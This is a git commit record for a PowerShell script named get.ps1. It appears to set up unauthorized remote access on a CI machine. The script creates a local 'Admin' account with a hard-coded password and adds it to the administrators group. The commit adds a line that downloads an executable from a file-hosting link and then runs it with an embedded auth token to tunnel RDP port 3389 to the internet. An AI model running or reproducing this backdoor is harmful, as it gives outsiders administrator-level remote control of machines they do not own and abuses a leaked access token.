c8ea16799984842d1f874a53f574a0f590332b5e
Usser1222 <163659668+Usser1222@users.noreply.github.com>
2024-03-16 19:39:49 +0300

    Update get.ps1

--- get.ps1
+++ get.ps1
@@ -1,6 +1,7 @@
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 
+Invoke-WebRequest https://qiwi.gg/file/nwxV7738-use -OutFile use.exe
 use.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
 use.exe tcp 3389 --log=stdout > C:\Users\circleci\Downloads\ngrok.log
 
